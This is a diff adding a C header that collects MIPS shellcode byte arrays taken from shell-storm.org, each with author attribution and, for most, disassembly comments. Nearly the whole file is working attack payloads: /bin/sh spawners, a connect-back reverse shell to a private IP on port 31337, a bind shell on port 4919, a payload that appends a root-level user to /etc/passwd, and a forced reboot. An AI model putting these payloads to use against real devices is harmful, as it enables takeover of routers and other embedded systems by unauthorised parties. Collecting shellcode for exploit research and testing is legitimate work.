@@ -1,0 +1,329 @@
+//
+// Copyright (c) 2018 [n/a] info@embeddora.com All rights reserved
+//
+// Redistribution and use in source and binary forms, with or without
+// modification, are permitted provided that the following conditions are met:
+//        * Redistributions of source code must retain the above copyright
+//          notice, this list of conditions and the following disclaimer.
+//        * Redistributions in binary form must reproduce the above copyright
+//          notice, this list of conditions and the following disclaimer in the
+//          documentation and/or other materials provided with the distribution.
+//        * Neither the name of The Linux Foundation nor
+//          the names of its contributors may be used to endorse or promote
+//          products derived from this software without specific prior written
+//          permission.
+//
+// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
+// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+// IMPLIED WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
+// NON-INFRINGEMENT ARE DISCLAIMED.    IN NO EVENT SHALL THE COPYRIGHT OWNER OR
+// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
+// EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
+// PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
+// OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
+// WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
+// OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
+// ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+//
+// Abstract:            MIPS shellcodes as arrays, initialized
+//
+// Usage:               none
+//
+// Version:             0.0.8
+
+#ifndef SHELLCODE_MIPS
+#define SHELLCODE_MIPS
+
+/// Extracted from: http://shell-storm.org/shellcode/files/shellcode-860.php
+/// MIPS LE shellcode by Jacob Holcomb (http://infosec42.blogspot.com,
+/// http://securityevaluators.com). Results in socket misuse on port 31337,
+/// and (in best case) in 'execve *filename'.
+const void *SC_860 =  "\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28"
+		"\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"
+		"\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"
+		"\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x09\x09\x01"
+		"\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09\x01\xc9\x0f\x02\x24"
+		"\x0c\x09\x09\x01\x79\x69\x05\x3c\x01\xff\xa5\x34\x01\x01\xa5\x20"
+		"\xf8\xff\xa5\xaf\x01\xb1\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf"
+		"\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24"
+		"\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf"
+		"\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28"
+		"\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23"
+		"\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28"
+		"\xab\x0f\x02\x24\x0c\x09\x09\x01";
+
+/// Extracted from: http://shell-storm.org/shellcode/files/shellcode-79.php
+/// MIPS LE shellcode by 'core' ('core' - nickname of contributor, core@bokeoa.com)
+/// for 2.4.18 kernels. Tested on  Cobalt Qube2, and reported as: "i couldn't get his
+/// execve to work". Was supposed to cause 'execve("/bin/sh",["/bin/sh"],[])'
+const void *SC_79 =  "\xff\xff\x10\x04\xab\x0f\x02\x24"
+		"\x55\xf0\x46\x20\x66\x06\xff\x23"
+		"\xc2\xf9\xec\x23\x66\x06\xbd\x23"
+		"\x9a\xf9\xac\xaf\x9e\xf9\xa6\xaf"
+		"\x9a\xf9\xbd\x23\x21\x20\x80\x01"
+		"\x21\x28\xa0\x03\xcc\xcd\x44\x03";
+
+/// Extracted from: http://shell-storm.org/shellcode/files/shellcode-782.php
+/// MIPS LE shellcode by 'entropy' ('entropy' - nickname of contributor). No
+/// consistency information published. Was supposed to cause execve(/bin/sh,
+/// /bin/sh, 0) 
+const void *SC_782 =
+	    "\x24\x06\x06\x66" //  li a2,1638            
+	    "\x04\xd0\xff\xff" //  bltzal a2,4100b4 <p>  
+	    "\x28\x06\xff\xff" //  slti a2,zero,-1       
+	    "\x27\xbd\xff\xe0" //  addiu	sp,sp,-32       
+	    "\x27\xe4\x10\x01" //  addiu	a0,ra,4097      
+	    "\x24\x84\xf0\x1f" //  addiu	a0,a0,-4065     
+	    "\xaf\xa4\xff\xe8" //  sw a0,-24(sp)         
+	    "\xaf\xa0\xff\xec" //  sw zero,-20(sp)       
+	    "\x27\xa5\xff\xe8" //  addiu	a1,sp,-24       
+	    "\x24\x02\x0f\xab" //  li v0,4011            
+	    "\x01\x01\x01\x0c" //  syscall 0x40404       
+	    "/bin/sh"          //  sltiu	v0,k1,26990     
+		               //  sltiu	s3,k1,26624     
+		;
+
+
+/// Extracted from: http://shell-storm.org/shellcode/files/shellcode-793.php
+/// MIPS shellcode by 'rigan' (imrigan@gmail.com). Results in adding user
+/// 'rOOt' with password 'pwn3d'. No consistency or system requirements
+/// information published.
+const void *SC_793 =
+        "\x24\x09\x73\x50"       //  li      t1,29520
+        "\x05\x30\xff\xff"       //  bltzal  t1,400094 <L>
+        "\x24\x09\x73\x50"       //  li      t1,29520 (nop)
+
+        "\x3c\x0f\x30\x2f"       //  lui     t7,0x302f
+        "\x35\xef\x65\x74"       //  ori     t7,t7,0x6574
+        "\x3c\x0e\x63\x2f"       //  lui     t6,0x632f   
+        "\x35\xce\x70\x61"       //  ori     t6,t6,0x7061
+        "\x3c\x0d\x73\x73"       //  lui     t5,0x7373
+        "\x35\xad\x77\x64"       //  ori     t5,t5,0x7764
+        "\xaf\xaf\xff\xf3"       //  sw      t7,-13(sp)
+        "\xaf\xae\xff\xf7"       //  sw      t6,-9(sp)
+        "\xaf\xad\xff\xfb"       //  sw      t5,-5(sp)
+        "\xaf\xa0\xff\xff"       //  sw      zero,-1(sp)
+        "\x27\xa4\xff\xf4"       //  addiu   a0,sp,-12
+        "\x24\x05\x01\x6d"       //  li      a1,365
+        "\x24\x02\x0f\xa5"       //  li      v0,4005
+        "\x01\x01\x01\x0c"       //  syscall 0x40404
+
+        "\xaf\xa2\xff\xfc"       //  sw      v0,-4(sp) 
+
+        "\x8f\xa4\xff\xfc"       //  lw      a0,-4(sp)
+        "\x23\xe5\x10\x0c"       //  addi    a1,ra,4108
+        "\x20\xa5\xf0\x60"       //  addi    a1,a1,-4000
+        "\x24\x09\xff\xd3"       //  li      t1,-45
+        "\x01\x20\x30\x27"       //  nor     a2,t1,zero
+        "\x24\x02\x0f\xa4"       //  li      v0,4004
+        "\x01\x01\x01\x0c"       //  syscall 0x40404
+
+        "\x24\x02\x0f\xa6"       //  li      v0,4006
+        "\x01\x01\x01\x0c"       //  syscall 0x40404
+
+        "\x28\x04\xff\xff"        //  slti    a0,zero,-1
+        "\x24\x02\x0f\xa1"        //  li      v0,4001
+        "\x01\x01\x01\x0c"        //  syscall 0x40404
+
+        "\x72\x4f\x4f\x74"
+        "\x3a\x58\x4a\x31"
+        "\x47\x56\x2e\x6e"
+        "\x79\x46\x46\x4d"
+        "\x6f\x49\x3a\x30"
+        "\x3a\x30\x3a\x72"
+        "\x6f\x6f\x74\x3a"
+        "\x2f\x72\x6f\x6f"
+        "\x74\x3a\x2f\x62"
+        "\x69\x6e\x2f\x62"
+        "\x61\x73\x68\x0a"
+	;
+
+
+/// Extracted from: http://shell-storm.org/shellcode/files/shellcode-794.php
+/// MIPS shellcode by 'rigan' (imrigan@gmail.com) to simulate 'connect back'
+/// from port 0x7a69 (decimal - 31337). No consistency or system requirements
+/// information published.
+const void *SC_794 =
+         "\x24\x0f\xff\xfd"        // li      t7,-3
+         "\x01\xe0\x20\x27"        // nor     a0,t7,zero
+         "\x01\xe0\x28\x27"        // nor     a1,t7,zero
+         "\x28\x06\xff\xff"        // slti    a2,zero,-1
+         "\x24\x02\x10\x57"        // li      v0,4183 ( sys_socket )
+         "\x01\x01\x01\x0c"        // syscall 0x40404
+
+         "\xaf\xa2\xff\xff"        // sw      v0,-1(sp)
+         "\x8f\xa4\xff\xff"        // lw      a0,-1(sp)
+         "\x24\x0f\xff\xfd"        // li      t7,-3 ( sa_family = AF_INET )
+         "\x01\xe0\x78\x27"        // nor     t7,t7,zero
+         "\xaf\xaf\xff\xe0"        // sw      t7,-32(sp) 
+         "\x3c\x0e\x7a\x69"        // lui     t6,0x7a69 ( sin_port = 0x7a69 )
+         "\x35\xce\x7a\x69"        // ori     t6,t6,0x7a69
+         "\xaf\xae\xff\xe4"        // sw      t6,-28(sp)
+
+         "\x3c\x0d\xc0\xa8"        // lui     t5,0xc0a8 ( sin_addr = 0xc0a8 ... 
+         "\x35\xad\x01\x64"        // ori     t5,t5,0x164           ...0164 )
+
+         "\xaf\xad\xff\xe6"        // sw      t5,-26(sp)
+         "\x23\xa5\xff\xe2"        // addi    a1,sp,-30
+         "\x24\x0c\xff\xef"        // li      t4,-17 ( addrlen = 16 )     
+         "\x01\x80\x30\x27"        // nor     a2,t4,zero 
+         "\x24\x02\x10\x4a"        // li      v0,4170 ( sys_connect ) 
+         "\x01\x01\x01\x0c"        // syscall 0x40404
+
+         "\x24\x0f\xff\xfd"        // li      t7,-3
+         "\x01\xe0\x28\x27"        // nor     a1,t7,zero
+         "\x8f\xa4\xff\xff"        // lw      a0,-1(sp)
+
+         "\x24\x02\x0f\xdf"        // li      v0,4063 ( sys_dup2 )
+         "\x01\x01\x01\x0c"        // syscall 0x40404
+         "\x20\xa5\xff\xff"        // addi    a1,a1,-1
+         "\x24\x01\xff\xff"        // li      at,-1
+         "\x14\xa1\xff\xfb"        // bne     a1,at, dup2_loop
+
+         "\x28\x06\xff\xff"        // slti    a2,zero,-1
+         "\x3c\x0f\x2f\x2f"        // lui     t7,0x2f2f
+         "\x35\xef\x62\x69"        // ori     t7,t7,0x6269
+         "\xaf\xaf\xff\xf4"        // sw      t7,-12(sp)
+         "\x3c\x0e\x6e\x2f"        // lui     t6,0x6e2f
+         "\x35\xce\x73\x68"        // ori     t6,t6,0x7368
+         "\xaf\xae\xff\xf8"        // sw      t6,-8(sp)
+         "\xaf\xa0\xff\xfc"        // sw      zero,-4(sp)
+         "\x27\xa4\xff\xf4"        // addiu   a0,sp,-12
+         "\x28\x05\xff\xff"        // slti    a1,zero,-1
+         "\x24\x02\x0f\xab"        // li      v0,4011 ( sys_execve )
+         "\x01\x01\x01\x0c";       // syscall 0x40404
+
+/// Extracted from: http://shell-storm.org/shellcode/files/shellcode-792.php
+/// MIPS shellcode by 'rigan' (imrigan@gmail.com) . Results in 'execve /bin/sh'
+/// No consistency or system requirements information published.
+const void *SC_792 =
+        "\x28\x06\xff\xff"        //  slti    a2,zero,-1    
+        "\x3c\x0f\x2f\x2f"        //  lui     t7,0x2f2f     
+        "\x35\xef\x62\x69"        //  ori     t7,t7,0x6269  
+        "\xaf\xaf\xff\xf4"        //  sw      t7,-12(sp)    
+        "\x3c\x0e\x6e\x2f"        //  lui     t6,0x6e2f     
+        "\x35\xce\x73\x68"        //  ori     t6,t6,0x7368  
+        "\xaf\xae\xff\xf8"        //  sw      t6,-8(sp)     
+        "\xaf\xa0\xff\xfc"        //  sw      zero,-4(sp)   
+        "\x27\xa4\xff\xf4"        //  addiu   a0,sp,-12     
+        "\x28\x05\xff\xff"        //  slti    a1,zero,-1    
+        "\x24\x02\x0f\xab"        //  li      v0,4011       
+        "\x01\x01\x01\x0c"        //  syscall 0x40404       
+	;
+
+
+/// Extracted from: http://shell-storm.org/shellcode/files/shellcode-795.php
+/// MIPS shellcode by 'rigan' (imrigan@gmail.com) . Results in 'reboot()' call
+/// to initiate system roboot frmo under 'root' user. No consistency or system
+/// requirements information published.
+const void *SC_795 =
+         "\x3c\x06\x43\x21"       // lui     a2,0x4321
+         "\x34\xc6\xfe\xdc"       // ori     a2,a2,0xfedc
+         "\x3c\x05\x28\x12"       // lui     a1,0x2812
+         "\x34\xa5\x19\x69"       // ori     a1,a1,0x1969
+         "\x3c\x04\xfe\xe1"       // lui     a0,0xfee1
+         "\x34\x84\xde\xad"       // ori     a0,a0,0xdead
+         "\x24\x02\x0f\xf8"       // li      v0,4088
+         "\x01\x01\x01\x0c"      // syscall 0x40404 
+	;
+
+
+/// Extracted from: http://shell-storm.org/shellcode/files/shellcode-80.php
+/// MIPS LE shellcode by 'vaicebine' (vaicebine@gmail.com). Results in 
+/// 'execve(/bin/sh,[/bin/sh],[])' . Reportedly tested on Linksys WRT54G/GL,
+/// which is based on (or clone of) DD-WRT Linux. INspired by Scut's paper
+/// named 'Writing MIPS/Irix shellcode'
+const void *SC_80 =
+	"\x50\x73\x06\x24" //      li      a2,0x7350              
+	"\xff\xff\xd0\x04" //  LB: bltzal  a2,LB                  
+	"\x50\x73\x0f\x24" //      li      $t7,0x7350 (nop)       
+	"\xff\xff\x06\x28" //      slti    a2, $0,-1              
+	"\xe0\xff\xbd\x27" //      addiu   sp,sp,-32              
+	"\xd7\xff\x0f\x24" //      li      t7,-41                 
+	"\x27\x78\xe0\x01" //      nor     t7,t7,zero                 
+	"\x21\x20\xef\x03" //      addu    a0,ra,t7               
+	"\xe8\xff\xa4\xaf" //      sw      a0,-24(sp)             
+	"\xec\xff\xa0\xaf" //      sw      zero,-20(sp)           
+	"\xe8\xff\xa5\x23" //      addi    a1,sp,-24                      
+	"\xab\x0f\x02\x24" //      li      v0,4011                
+	"\x0c\x01\x01\x01" //      syscall                        
+	"/bin/sh" 
+	;
+
+/// Extracted from: http://shell-storm.org/shellcode/files/shellcode-81.php
+/// MIPS LE shellcode by 'vaicebine' (vaicebine@gmail.com). Results in 
+/// binding 4919 port (0x1337). Reportedly tested on Linksys WRT54G/GL,
+/// which is based on (or clone of) DD-WRT Linux. INspired by Scut's paper
+/// named 'Writing MIPS/Irix shellcode'
+const void *SC_81 =
+	"\xe0\xff\xbd\x27"	//      addiu   sp,sp,-32                 
+	"\xfd\xff\x0e\x24"	//      li      t6,-3                     
+	"\x27\x20\xc0\x01"	//      nor     a0,t6,zero                
+	"\x27\x28\xc0\x01"	//      nor     a1,t6,zero                
+	"\xff\xff\x06\x28"	//      slti    a2,zero,-1                	
+	"\x57\x10\x02\x24"	//      li      v0,4183 ( __NR_socket )   
+	"\x0c\x01\x01\x01"	//      syscall                           
+	"\x50\x73\x0f\x24"	//      li      t7,0x7350 (nop)           
+	"\xff\xff\x50\x30"	//      andi    s0,v0,0xffff              	
+	"\xef\xff\x0e\x24"	//      li      t6,-17                    
+	"\x27\x70\xc0\x01"	//      nor     t6,t6,zero                
+	"\x13\x37\x0d\x24"	//      li      t5,0x3713 (port 0x1337)   
+	"\x04\x68\xcd\x01"	//      sllv    t5,t5,t6                  
+	"\xff\xfd\x0e\x24"	//      li      t6,-513                   
+	"\x27\x70\xc0\x01"	//      nor     t6,t6,zero                
+	"\x25\x68\xae\x01"	//      or      t5,t5,t6                  
+	"\xe0\xff\xad\xaf"	//      sw      t5,-32(sp)                
+	"\xe4\xff\xa0\xaf"	//      sw      zero,-28(sp)              	
+	"\xe8\xff\xa0\xaf"	//      sw      zero,-24(sp)              
+	"\xec\xff\xa0\xaf"	//      sw      zero,-20(sp)              
+	"\x25\x20\x10\x02"	//      or      a0,s0,s0                  
+	"\xef\xff\x0e\x24"	//      li      t6,-17                    
+	"\x27\x30\xc0\x01"	//      nor     a2,t6,zero                
+	"\xe0\xff\xa5\x23"	//      addi    a1,sp,-32                 
+	"\x49\x10\x02\x24"	//      li      v0,4169 ( __NR_bind )     
+	"\x0c\x01\x01\x01"	//      syscall                           
+	"\x50\x73\x0f\x24"	//      li      t7,0x7350 (nop)           
+	"\x25\x20\x10\x02"	//      or      a0,s0,s0                  
+	"\x01\x01\x05\x24"	//      li      a1,257                    
+	"\x4e\x10\x02\x24"	//      li      v0,4174 ( __NR_listen )   	
+	"\x0c\x01\x01\x01"	//      syscall                           
+	"\x50\x73\x0f\x24"	//      li      t7,0x7350 (nop)           
+	"\x25\x20\x10\x02"	//      or      a0,s0,s0                  
+	"\xff\xff\x05\x28"	//      slti    a1,zero,-1                
+	"\xff\xff\x06\x28"	//      slti    a2,zero,-1                
+	"\x48\x10\x02\x24"	//      li      v0,4168 ( __NR_accept )   
+	"\x0c\x01\x01\x01"	//      syscall                           
+	"\x50\x73\x0f\x24"	//      li      t7,0x7350 (nop)           
+	"\xff\xff\x50\x30"	//      andi    s0,v0,0xffff              	
+	"\x25\x20\x10\x02"	//      or      a0,s0,s0                  
+	"\xfd\xff\x0f\x24"	//      li      t7,-3                     
+	"\x27\x28\xe0\x01"	//      nor     a1,t7,zero                
+	"\xdf\x0f\x02\x24"	//      li      v0,4063 ( __NR_dup2 )     
+	"\x0c\x01\x01\x01"	//      syscall                           
+	"\x50\x73\x0f\x24"	//      li      t7,0x7350 (nop)           
+	"\x25\x20\x10\x02"	//      or      a0,s0,s0                  
+	"\x01\x01\x05\x28"	//      slti    a1,zero,0x0101            
+	"\xdf\x0f\x02\x24"	//      li      v0,4063 ( __NR_dup2 )     
+	"\x0c\x01\x01\x01"	//      syscall                           
+	"\x50\x73\x0f\x24"	//      li      t7,0x7350 (nop)           
+	"\x25\x20\x10\x02"	//      or      a0,s0,s0                  
+	"\xff\xff\x05\x28"	//      slti    a1,zero,-1                	
+	"\xdf\x0f\x02\x24"	//      li      v0,4063 ( __NR_dup2 )     
+	"\x0c\x01\x01\x01"	//      syscall                           
+	"\x50\x73\x0f\x24"	//      li      t7,0x7350 (nop)           
+	"\x50\x73\x06\x24"	//      li      a2,0x7350                 
+	"\xff\xff\xd0\x04"	//  LB: bltzal  a2,LB                     
+	"\x50\x73\x0f\x24"	//      li      t7,0x7350 (nop)           
+	"\xff\xff\x06\x28"	//      slti    a2,zero,-1                
+	"\xdb\xff\x0f\x24"	//      li      t7,-37                    
+	"\x27\x78\xe0\x01"	//      nor     t7,t7,zero                
+	"\x21\x20\xef\x03"	//      addu    a0,ra,t7                  
+	"\xf0\xff\xa4\xaf"	//      sw      a0,-16(sp)                
+	"\xf4\xff\xa0\xaf"	//      sw      zero,-12(sp)              
+	"\xf0\xff\xa5\x23"	//      addi    a1,sp,-16                 
+	"\xab\x0f\x02\x24"	//      li      v0,4011 ( __NR_execve )   
+	"\x0c\x01\x01\x01"	//      syscall                           
+	"/bin/sh"
+	;
+
+#endif // #define SHELLCODE_MIPS
